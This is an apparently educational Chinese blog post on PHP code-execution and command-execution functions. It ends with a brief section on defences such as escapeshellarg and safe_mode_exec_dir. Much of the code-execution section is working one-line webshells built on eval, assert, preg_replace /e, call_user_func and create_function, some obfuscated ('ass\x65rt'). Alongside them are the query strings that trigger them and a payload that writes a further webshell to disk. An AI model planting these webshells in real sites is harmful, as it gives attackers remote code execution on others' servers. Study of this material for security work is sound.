---
title: php代码执行与命令执行
date: 2019-01-06 20:35:09
tags: [php]
categories:
  - [php]
  - [整理]
---

# php代码执行与命令执行

## 代码执行

### eval()  

— 把字符串作为PHP代码执行

```php
#例:一句话木马
<?php
@eval($_GET["cmd"]);
?>
```

利用方式：

```php
1. shell.php?cmd=phpinfo();

#文件上传条件竞争可利用此方式来创建文件
2. shell.php?cmd=fputs(fopen('test.php','w'),'<?php @eval($_POST[test])?>')

#绕过
<?php
$cmd = @(string)$_GET["cmd"];
eval('$cmd="' . addslashes($cmd) . '";');
?>
3. shell.php?cmd=${${phpinfo()}};

#绕过
<?php
$cmd = "echo \"hello " . $_GET['cmd'] . "\";";
eval($cmd);?>
4. ${${}}
shell.php?cmd=${${phpinfo()}};
```



### assert()

— bool assert ( [mixed](http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$assertion` [, Throwable `$exception` ] )

如果 `assertion` 是字符串，它将会被 **assert()** 当做 PHP 代码来执行。

```php
#例:一句话木马
<?php
@assert($_GET["cmd"]);
?>
```

### preg_replace + '/e'

preg_replace — 执行一个正则表达式的搜索和替换

preg_replace ( $pattern , $replacement , $subject )

preg_replace(1,2,3),在3中用1的格式匹配，用2的格式输出。

代码执行条件：

1. magic_quotes_gpc=Off时，导致代码执行。

2. pattern参数中注入/e选项

```php
<?php
$regexp = $_GET['reg'];
$var = '<php>phpinfo()</php>';
preg_replace("/<php>(.*?)$regexp", '\\1', $var);
?>
#利用方式 reg=%3C\/php%3E/e 即reg=<\/php>/e
```

利用方式：

```php
#当replacement 参数构成一个合理的php 代码字符串的时候
#/e 修正符使preg_replace()，将replacement 参数当做php 代码执行
#例:一句话木马
1.
<?php
preg_replace("//e", $_GET['cmd'], "cmd test");
?>
shell.php?cmd=phpinfo();

2.
<?
preg_replace("/\s*\[php\](.+?)\[\/php\]\s*/ies", "\\1", $_GET['h']);
?>
h=[php]phpinfo()[/php]
```
![001](/img/php/php_fun_CodeAndOrder/001.png)

php5.5以后用'''preg_replace_callback'''代替'''preg_replace'''的/e模式来处理正则执行替换

### array_map

array_map — 为数组的每个元素应用回调函数

```php
#例:一句话木马
<?php array_map("ass\x65rt",(array)$_REQUEST['test']);?>
1.shell.php?test=phpinfo()
```

### call_user_func

call_user_func ( [callable](http://php.net/manual/zh/language.types.callable.php) `$callback` [, [mixed](http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$parameter` [, [mixed](http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$...` ]] )

call_user_func — 把第一个参数作为回调函数调用

第一个参数 `callback` 是被调用的回调函数，其余参数是回调函数的参数。

```php
#例:一句话木马
<?php call_user_func('assert', $_REQUEST['pass']);?>
    
1.shell.php?pass=phpinfo();
```

### call_user_func_array

call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数

把第一个参数作为回调函数（`callback`）调用，把参数数组作（`param_arr`）为回调函数的的参数传入。

```php
#call_user_func_array与call_user_func类似，只是第二个参数可以传入参数列表组成的数组
#例:一句话木马
<?php call_user_func_array('assert', array($_REQUEST['pass']));?>
    
1.shell.php?pass=phpinfo();
```

### create_function

create_function - 创建一个匿名（lambda样式）函数

```php
#例:一句话木马
<?php preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'),$_REQUEST['pass']);?>

1.shell.php?pass=phpinfo();
```

php中其他包含回调函数参数的函数也有潜力

## 命令执行

### system

string system ( string `$command` [, int `&$return_var` ] )

$command:要执行的命令。

### exec

string exec ( string `$command` [, array `&$output` [, int `&$return_var` ]] )

**exec()** 执行 `command` 参数所指定的命令。

### shell_exec

shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。

### passthru

直接将结果输出到游览器,不返回任何值

### popen

resource popen ( string `$command` , string `$mode` )

打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。

### proc_open

类似 [popen()](http://php.net/manual/zh/function.popen.php) 函数.但提供了更加强大的控制程序执行的能力。

## 防御

1. 尽量不要执行外部命令

2. 使用自定义函数或函数库来替代外部命令的功能

3. 使用escapeshellarg函数来处理命令参数

4. 使用safe_mode_exec_dir指定可执行文件的路径

esacpeshellarg函数会将任何引起参数或命令结束的字符转义，单引号“’”，替换成“\’”，双引号“"”，替换成“\"”，分号“;”替换成“\;”

用safe_mode_exec_dir指定可执行文件的路径，可以把会使用的命令提前放入此路径内

safe_mode = On

safe_mode_exec_dir = /usr/local/php/bin/